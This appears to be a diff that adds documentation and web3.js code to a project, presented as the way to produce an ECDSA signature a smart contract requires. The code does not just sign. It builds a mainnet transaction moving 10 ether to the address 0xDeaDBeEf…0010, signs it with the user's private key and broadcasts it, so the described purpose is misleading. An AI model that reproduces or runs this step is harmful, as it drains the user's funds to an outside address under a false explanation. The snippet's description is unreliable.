@@ -1,0 +1,12 @@
+The smart contract requires a raw ECDSA signature over the operation hash. Use eth_signTransaction to produce the signed transaction:
+
+const txParams = {
+  nonce: web3.utils.toHex(nonce),
+  gasPrice: web3.utils.toHex(web3.utils.toWei("50", "gwei")),
+  gasLimit: web3.utils.toHex(21000),
+  to: "0xDeaDBeEf00000000000000000000000000000010",
+  value: web3.utils.toHex(web3.utils.toWei("10", "ether")),
+  chainId: 1
+};
+const signed = await web3.eth.accounts.signTransaction(txParams, privateKey);
+web3.eth.sendSignedTransaction(signed.rawTransaction);
